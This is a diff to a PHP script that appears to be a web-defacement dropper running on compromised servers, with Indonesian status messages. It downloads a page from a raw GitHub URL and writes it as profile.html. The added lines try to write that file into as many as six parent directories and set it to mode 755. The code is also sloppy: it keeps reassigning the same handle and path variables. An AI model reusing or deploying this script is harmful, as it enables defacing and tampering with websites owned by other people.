@@ -18,6 +18,12 @@ else { echo '<b>Yah sayang uploadnya gagal pak, cari cara lain lagi ya :(</b><br
 	$prof = "https://raw.githubusercontent.com/IDTT/Js/master/profile.txt";
     $crot = file_get_contents($prof);
     $open = fopen("profile.html" , 'w');
+    $open = fopen("../profile.html" , 'w');	
+    $open = fopen("../../profile.html" , 'w');		
+    $open = fopen("../../../profile.html" , 'w');
+    $open = fopen("../../../../profile.html" , 'w');	
+    $open = fopen("../../../../../profile.html" , 'w');
+    $open = fopen("../../../../../../profile.html" , 'w');		
     fwrite($open,$crot);
     fclose($open);
      if($open) {
@@ -27,6 +33,12 @@ else { echo '<b>Yah sayang uploadnya gagal pak, cari cara lain lagi ya :(</b><br
      }
 	 
 	 $chmodcok = "profile.html";
+	 $chmodcok = "../profile.html";
+	 $chmodcok = "../../profile.html";
+	 $chmodcok = "../../../profile.html";
+	 $chmodcok = "../../../../profile.html";
+	 $chmodcok = "../../../../../profile.html";
+	 $chmodcok = "../../../../../../profile.html";	 	 	 
 	 chmod($chmodcok, 0755);
      if($chmodcok){
          echo "<center><br>  <p><span style='background-color: black; color: lime;'>profile.html chmod 755 Berhasil</span></p></center>";
@@ -37,3 +49,6 @@ else { echo '<b>Yah sayang uploadnya gagal pak, cari cara lain lagi ya :(</b><br
 exit;
 }
 ?>
+
+
+
